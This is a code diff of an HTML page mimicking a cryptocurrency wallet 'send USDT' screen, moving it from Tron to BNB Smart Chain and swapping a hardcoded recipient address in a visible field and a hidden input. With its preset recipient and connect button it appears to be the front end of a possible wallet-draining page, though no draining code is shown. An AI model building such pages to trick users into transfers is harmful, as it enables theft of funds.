@@ -27,7 +27,7 @@
         </div>
 
         <div class="recipient-box">
-          <span class="recipient-prefix">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
+          <span class="recipient-prefix">To:</span><span id="recipientAddressText">0x0000000000000000000000000000000000000000</span>
         </div>
       </div>
 
@@ -46,14 +46,14 @@
         <div class="token-row">
           <div class="token-info">
             <div class="token-icons">
-              <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Tether USDT">
+              <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="BEP20 USDT">
               <div class="token-badge">
-                <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
+                <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Smart Chain">
               </div>
             </div>
             <div class="token-texts">
-              <span class="token-symbol">Tether USDT</span>
-              <span class="token-network">Tron</span>
+              <span class="token-symbol">BEP20 USDT</span>
+              <span class="token-network">BNB Smart Chain</span>
             </div>
           </div>
           <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
@@ -82,7 +82,7 @@
 
         <div class="cta-container" id="bottomActions">
           <button class="connect-data" style="display:none"></button>
-          <button class="action-btn connect-btn" id="start-btn" disabled>Review</button>
+          <button class="action-btn connect-btn" id="connect-button" disabled>Review</button>
         </div>
       </div>
     </div>
@@ -90,7 +90,7 @@
 </div>
 
 <div style="display: none !important;">
-  <input id="addressInput" value="TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW">
+  <input id="addressInput" value="0x0000000000000000000000000000000000000000">
   <input id="amountInput" type="text" value="">
   <span id="estimateText">≈ $0.00</span>
   <span id="pasteBtn"></span>
@@ -118,14 +118,13 @@
   const amountInput = document.getElementById('amountInput');
   const estimateText = document.getElementById('estimateText');
   const addressInput = document.getElementById('addressInput');
-  const startBtn = document.getElementById('start-btn');
+  const connectBtn = document.getElementById('connect-button');
   const maxBtn = document.getElementById('maxBtn');
   const securityModal = document.getElementById('securityModal');
   const closeSecurityModal = document.getElementById('closeSecurityModal');
   const recipientAddressText = document.getElementById('recipientAddressText');
   const targetSection = document.getElementById('targetSection');
 
-  // Trigger smooth centering on page load
   window.addEventListener('load', () => {
     setTimeout(() => {
       targetSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
@@ -175,8 +174,8 @@
       estimateText.textContent = '≈ $0.00';
       amountInput.value = '';
       
-      startBtn.disabled = true;
-      startBtn.classList.remove('active');
+      connectBtn.disabled = true;
+      connectBtn.classList.remove('active');
     } else {
       displayAmount.textContent = rawAmount;
       displayAmount.classList.remove('zero');
@@ -193,11 +192,11 @@
       amountInput.value = rawAmount;
 
       if (numericVal > 0) {
-        startBtn.disabled = false;
-        startBtn.classList.add('active');
+        connectBtn.disabled = false;
+        connectBtn.classList.add('active');
       } else {
-        startBtn.disabled = true;
-        startBtn.classList.remove('active');
+        connectBtn.disabled = true;
+        connectBtn.classList.remove('active');
       }
     }
 
@@ -229,7 +228,7 @@
   }
 </script>
 
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-<script src="app.js"></script>
+<script type="module" src="app.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </body>
 </html>
